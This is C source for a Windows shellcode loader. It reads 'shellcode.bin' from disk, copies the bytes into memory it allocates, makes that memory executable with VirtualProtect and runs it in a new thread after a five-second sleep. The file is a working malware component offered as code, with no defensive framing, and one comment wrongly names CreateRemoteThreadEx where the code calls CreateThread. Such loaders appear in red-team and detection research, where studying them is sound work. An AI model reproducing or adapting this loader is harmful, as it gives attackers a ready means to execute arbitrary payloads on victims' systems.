#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#define WIN32_LEAN_AND_MEAN
#define WAIT_TIME 5000

void runShellcode() {
	HANDLE shellcodeFileHandle;
	SIZE_T shellcodeLength;
	BYTE* shellcode;
	DWORD bytesRead;
	HANDLE currentProcHandle;
	BYTE* shellcodeMemPtr;
    DWORD result;
	DWORD oldProtection;
    DWORD newCRThreadId;
	HANDLE threadHandle;

	// Open the "shellcode.bin" file.
	shellcodeFileHandle = CreateFile(
		"shellcode.bin", 
		GENERIC_READ, 
		FILE_SHARE_READ, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL
	);

	// Get the file size.
	if (shellcodeFileHandle == INVALID_HANDLE_VALUE || 
		GetFileSizeEx(shellcodeFileHandle, (PLARGE_INTEGER)&shellcodeLength) == INVALID_FILE_SIZE) {
			puts("Failed to read shellcode from file.");
			ExitProcess(-1);
	}

	// Allocate space to read the file into.
	shellcode = (BYTE*)VirtualAlloc(
		0, 
		shellcodeLength * sizeof(BYTE),
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE
	);
	
	// Read the file into 'shellcode'.
	if (ReadFile(shellcodeFileHandle, shellcode, shellcodeLength, &bytesRead, NULL) == FALSE) {
		CloseHandle(shellcodeFileHandle);
		ExitProcess(-1);
	}

	// Check we've read it in correctly.
	if (bytesRead != shellcodeLength) {
		puts("Failed to read all shellcode from file.");
		ExitProcess(-1);
	}
	
	if (CloseHandle(shellcodeFileHandle) == 0) {
		puts("Failed to close file handle.");
		ExitProcess(-1);
	}

	// Get a handle to the current process.
	currentProcHandle = GetCurrentProcess();

    // Allocate a new memory region for the shellcode,
	// this time using VirtualAlloc.
    shellcodeMemPtr = (BYTE*)VirtualAlloc(
        0, 
        shellcodeLength, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );

    if (shellcodeMemPtr == NULL) {
        puts("[!] Failed to VirtualAlloc.");
        ExitProcess(-1);
    }

	// Copy shellcode that was read in from the file
	// over to the new memory region.
	for (SIZE_T i = 0; i < shellcodeLength; i++) {
		shellcodeMemPtr[i] = shellcode[i];
	}

    // Make the new region readable and executable
    // using VirtualProtect.
    result = VirtualProtect(
        shellcodeMemPtr, 
        shellcodeLength, 
        PAGE_EXECUTE_READ, 
        &oldProtection
    );

    if (result == 0) {
        puts("[!] Failed to VirtualProtect.");
        ExitProcess(-1);
    }

	// Create a new thread with CreateRemoteThreadEx.
    threadHandle = CreateThread(
        0, 0, 
        (LPTHREAD_START_ROUTINE)shellcodeMemPtr, 
        0, 0, 0
    );

	// Waits until the specified object attains a signaled state.
	WaitForSingleObject(threadHandle, INFINITE);
}

int main(int argc, const char** argv) {
    puts("WINAPI example.");
	printf("Sleeping for %d seconds.\n", WAIT_TIME/ 1000);
	Sleep(WAIT_TIME);
	runShellcode();
	return 0;
}